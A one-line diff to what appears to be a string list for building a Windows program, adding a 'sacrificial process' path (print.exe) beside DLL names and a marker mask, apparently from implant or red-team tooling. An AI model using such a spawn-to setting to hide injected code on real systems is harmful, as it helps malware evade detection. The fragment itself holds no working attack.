@@ -59,6 +59,7 @@ plain_strings = [
     "#define S_KERNEL32               \"kernel32.dll\"",
     "#define S_ADVAPI32               \"advapi32.dll\"",
     "#define S_IPHLPAPI               \"iphlpapi.dll\"",
+    "#define S_SACR_PROC              \"C:\\Windows\\System32\\print.exe\"",
     "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""
 
 ]
